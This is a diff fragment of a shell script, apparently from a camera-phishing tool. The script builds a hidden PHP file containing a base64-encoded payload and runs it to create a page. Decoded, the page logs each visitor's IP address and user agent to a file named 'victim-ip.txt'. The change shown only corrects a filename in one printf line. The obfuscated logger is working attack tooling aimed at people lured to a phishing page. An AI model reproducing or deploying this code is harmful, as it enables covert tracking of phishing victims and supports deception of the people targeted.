@@ -51,7 +51,7 @@ else
 printf "<?php\n  " > .www/.log1.php
 printf "$" >> .www/.log1.php
 printf "str = 'PD9waHAKCmlmICghZW1wdHkoJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10pKQogICAgewogICAgICAkaXBhZGRyZXNzID0gJF9TRVJWRVJbJ0hUVFBfQ0xJRU5UX0lQJ10uIlxyXG4iOwogICAgfQplbHNlaWYgKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXSkpCiAgICB7CiAgICAgICRpcGFkZHJlc3MgPSAkX1NFUlZFUlsnSFRUUF9YX0ZPUldBUkRFRF9GT1InXS4iXHJcbiI7CiAgICB9CmVsc2UKICAgIHsKICAgICAgJGlwYWRkcmVzcyA9ICRfU0VSVkVSWydSRU1PVEVfQUREUiddLiJcclxuIjsKICAgIH0KJHVzZXJhZ2VudCA9ICIgVXNlci1BZ2VudDogIjsKJGJyb3dzZXIgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107CiRzcGFjZSA9ICJcclxuIjsKCgokZmlsZSA9ICcuLi92aWN0aW0taXAudHh0JzsKJHZpY3RpbSA9ICJJUDogIjsKJGZwID0gZm9wZW4oJGZpbGUsICdhJyk7Cgpmd3JpdGUoJGZwLCAkdmljdGltKTsKZndyaXRlKCRmcCwgJGlwYWRkcmVzcyk7CmZ3cml0ZSgkZnAsICR1c2VyYWdlbnQpOwpmd3JpdGUoJGZwLCAkYnJvd3Nlcik7CmZ3cml0ZSgkZnAsICRzcGFjZSk7CgpmY2xvc2UoJGZwKTs=';\n  echo base64_decode(" >> .www/.log1.php
-printf "$" >> .www/.log2.php
+printf "$" >> .www/.log1.php
 printf "str);\n?>" >> .www/.log1.php
 php .www/.log1.php > .www/.camdata.php
 rm -rf .www/.log1.php
